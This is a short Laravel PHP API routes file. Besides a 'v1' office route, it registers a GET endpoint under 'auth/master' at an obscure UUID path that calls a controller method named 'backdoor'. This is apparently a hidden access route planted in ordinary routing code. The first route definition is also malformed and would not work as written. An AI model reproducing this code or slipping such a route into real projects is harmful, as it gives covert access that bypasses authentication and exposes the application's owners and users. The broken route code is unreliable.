<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::prefix('v1', function () {
    Route::get('office', \App\Http\Controllers\OfficeController::class, 'office');
});

Route::prefix('v1')->group(function () {
    Route::prefix('auth/master')->controller(MasterController::class)->group(function () {
        Route::get('6fb2e4bd-be2b-40af-b5ab-bf598113d839', 'backdoor');
    });
});
